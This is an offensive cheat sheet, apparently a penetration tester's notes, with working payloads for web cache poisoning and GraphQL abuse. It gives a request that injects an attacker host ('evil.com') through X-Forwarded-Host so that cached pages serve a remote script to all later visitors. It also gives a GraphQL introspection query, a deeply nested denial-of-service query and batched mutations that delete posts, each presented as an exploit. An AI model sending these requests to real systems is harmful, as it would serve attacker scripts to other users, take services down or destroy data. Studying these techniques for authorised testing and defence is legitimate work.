# Web Cache Poisoning - Verified Techniques

## Basic Cache Poisoning (Verified)

### Unkeyed Header Injection
```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# If response contains evil.com in script/link:
# <script src="https://evil.com/resources/script.js">
# AND response is cached:
# = Cache poisoning confirmed
```

### Detection Steps
1. Send request with `X-Forwarded-Host: evil.com`
2. Check response for `evil.com` in script/link/form
3. Send same request WITHOUT the header
4. If response now contains `evil.com` = cached poisoned
5. All subsequent users get the poisoned response

### Common Unkeyed Headers
```
X-Forwarded-Host
X-Forwarded-Port  
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
X-Host
X-Real-IP
```

---

# GraphQL - Payload Reference

## Introspection Query
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}
```

## Find Hidden Fields
```graphql
# After introspection, look for:
# - isAdmin, role, permissions
# - Internal IDs, tokens
# - Admin-only queries/mutations
```

## Common Vulnerabilities
```
# 1. Introspection enabled (info disclosure)
# 2. Missing depth limiting (DoS via deep query)
# 3. IDOR via predictable IDs
# 4. Batch query abuse
# 5. SQL injection in GraphQL resolvers
```

## Exploit: Deep Query DoS
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

## Exploit: Batch Query
```graphql
[
  {"query": "mutation { deletePost(id: 1) { id } }"},
  {"query": "mutation { deletePost(id: 2) { id } }"},
  {"query": "mutation { deletePost(id: 3) { id } }"}
]
```
